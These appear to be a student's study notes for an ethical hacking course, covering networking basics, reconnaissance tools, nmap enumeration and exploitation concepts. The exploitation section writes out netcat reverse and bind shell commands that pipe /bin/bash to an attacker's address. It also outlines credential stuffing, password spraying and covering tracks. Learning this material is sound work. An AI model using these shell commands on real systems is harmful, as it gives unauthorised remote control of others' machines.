- Understand the different types of pentesting and the most common things to be checked with each:
  - External/Internal Network
    - Active Directory
  - Web Application
    - OWASP
  - Physical
    - Social Engineering (Phishing, Vishing, Spear Phishing, etc.)
  - Mobile
  - IoT
  - Car
  - etc.

[SIDENOTE: check out cherrytree on Kali linux]

- Note taking:
  - Make sure to keep detailed notes:
    - Descriptive commentary
    - Dates
    - Screenshots of results (consider Greenshot on Windows, or Flameshot on Linux)


- MAC Addresses are used as device identifier for switching (layer 2)
- IP Addresses are used as host identifiers (layer 3)
  - IPv4 makes heavy use of NAT so that a single IP Address can have subnets
    - NAT makes use of ports to make multiple connections at the router level
- TCP and UDP are protocols for the transfer of data (layer 4)
  - TCP is connection-oriented, and offers reliable, slow data transfer
    - Useful for file transfers, or data transfer where integrity is paramount
    - Defined by SYN > SYN ACK > ACK process to establish a connection
    - Common ports/protocols:
      - 21  -> FTP
      - 22  -> SSH
      - 23  -> Telnet
      - 25  -> SMTP (email) 
      - 53  -> DNS
      - 80  -> HTTP
      - 110 -> POP3 (email)
      - 139 -> SMB (file shares)
      - 143 -> IMAP (email)
      - 443 -> HTTPS
      - 445 -> SMB (file shares)
  - UDP is connectionless, and offers best effort, fast data transfer
    - Useful for streaming, VoIP, etc.
    - Common ports/protocols:
      - 53  -> DNS
      - 67  -> DHCP
      - 68  -> DHCP
      - 69  -> TFTP (like FTP, but using UDP)
      - 161 -> SNMP


- OSI Model
  Pneumonic: Please Do Not Throw Sausage Pizza Away
  Layer 1 - [P]hysical layer: cables, hardware
  Layer 2 - [D]ata layer: switches, MAC addresses
  Layer 3 - [N]etwork layer: IP Addresses, routing
  Layer 4 - [T]ransport layer: TCP/UDP
  Layer 5 - [S]ession layer: session management
  Layer 6 - [P]resentation layer: media, wmv, jpg, mov
  Layer 7 - [A]pplication layer: HTTP, SMTP


- Subnetting
  - /x is the CIDR notation
    - Classless Inter-Domain Routing
  - /24 is the most common for a home network
    - subnet mask 255.255.255.0
  - /16 can occur for larger organizations that will have moe devices connected to the network
    - subnet mask 255.255.0.0
  - Can technically have /1 ~ /32
    - i.e, (2^32) - 2 devices ~ 1 device
  - First address of the block (usually) is the network ID
  - Last address (usually) is the broadcast ID

- Useful commands
  $ grep 'sudo' /etc/group
    - find all users in the sudoers group
  $ ip a
    - list all networking devices and interfaces
  $ ip n
    - list all neighbors to this device
  $ ip r
    - list routes

- Services
  $ sudo service apache2 start
    - starts a webserver on the localhost
  $ sudo service apache2 stop
    - stops a webserver on the localhost
  $ python3 -m http.server 80
    - starts a server on port given as parameter (80 in the above example)
    - this exposes all files within the directory from which the command is run
  $ sudo systemctl enable ssh
    - enables ssh on the machine in perpetuity
    - replace enable with disable to have the opposite effect

[checkout pimpmykali on GitHub]

- Sockets
  - Sockets are used to make a connection between ports and IP addresses


- Five Stages of Ethical Hacking
  NOTE: the first two stages are the foundation that supports the latter stages: thorough preparation makes the exploitation easier
  1.  Reconnaissance
    - Active:
      - Directly searching for potential attack vectors on the target
    - Passive:
      - Looking for tools/information to aid in attacking target
  2.  Scanning & Enumeration
    - Determining specific points of entry for an attack
      - e.g., looking for open ports and vulnerable services running on said ports
  3.  Gaining Access [Exploitation]
    - Using vulnerabilities and attack vectors found in previous steps to get a foothold inside the target's operations
  4.  Maintaining Access
    - Being able to keep the access point persistent for the duration of the pentest
  5.  Covering Tracks
    - Attempting to leave no trace that you were there or about what your true purpose there was (obfuscating tracks through red herrings if it's impossible to cover tracks)
    - Cleaning up logs, malware, etc.



RECONNAISSANCE
  - Passive:
    - Physical: 
      - Satellite images of location
      - Drone recon
      - Building schematics/layout (doors, locks, badge readers, fences, etc.)
    - Social:
      - Employee data (names, titles, numbers, etc.)
      - Pictures (badge photos, computer photos, etc.)
    - Web/Host:
      - Target validation
        - WHOIS, nslookup, dnsrecon
      - Finding subdomains
        - Google Fu, dig, nmap, sublist3r, Bluto, crt.sh, etc.
      - Fingerprinting
        - Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat
      - Data breaches
        - HaveIBeenPwned, Breach-Parse, WeLeakInfo
  - Discovering email addresses:
    - Go through data breach databases to find username and passwords
  - Hunting Subdomains:
    - sublist3r can find subdomains
    - OWASP amass
      - more comprehensive, but more time consuming that sublist3r
  - Website analyzers:
    - WhatWeb, Wappalyzer, BuiltWith are all tools that can help discover what a website uses on its frontend, sometimes payment systems, and other services
      - If the website uses vulnerable versions, this can be exploited
  - BurpSuite:
    - A web proxy that can intercept traffic from websites

ENUMERATION
  - Vulhub
    - Has lots of vulnerable virtual machine images to practice on
  - nmap
    - Useful for enumerating open ports and associated metadata
    - Can make it stealither:
      - make slower
    - Can scan all ports or just specific ports
    - Can fingerprint (get version, OS, etc.)
    - Can scan TCP and/or UDP
      - A UDP scan takes A LOOOONG time to complete
  - Identify the ports that are usually most vulnerable
    - 80 (HTTP), 443 (HTTPS), 139 (SMB)
  - Nessus is a paid vulnerability scanner

___________________________
!!!! IMPORTANT !!!!
Must develop a system for enumerating/note-taking
Ideas:
  - Always save scans to text files
  - Timestamp
  - Categorize
    - e.g., when finding version numbers for software used, put them all together for easy access when researching potential exploits later
___________________________

EXPLOITATION
  - Reverse shells
    - A victim connects to you
    - Far more common than Bind shells
    - Example:
      On Attacker's Machine:
        $ nc -nvlp <port>                   # opens a port, which netcat then listens to for when the victim connects
      On Victim's Machine:
        $ nc <IP addr> <port> -e /bin/bash  # connects to attacker's IP addr on port and starts a bash shell
  - Bind shells
    - You open up a port and connect to the victim 
    - Useful when you are behind a firewall or on a private network and don't want to fiddle with NAT
    Example:
      On Victim's Machine:
        $ nc -nvlp <port> -e /bin/bash  # opens a shell on port of Victim's machine
      On Attacker's Machine:
        $ nc <IP addr> <port>           # connects to shell on open port at Victim's IP addr
  - Payloads
    - Staged vs. Non-Staged
      - Diff = send in stages or send all at once
  - Credential Stuffing
    - Taking leaked credentials and attempting to use these credentials to sign in
  - Password Spraying
    - Taking known users and using good guesses of their passwords
      - Be careful because you could lock out real users if you attack Active Directory
  - Spiking/Fuzzing
    - I'm not entirely sure what the difference between these two is
    - Trying to find a buffer overflow opportunity by inputting lots of character data
    - Goal is to find the offset where we can overwrite the EIP register (this is the return pointer)
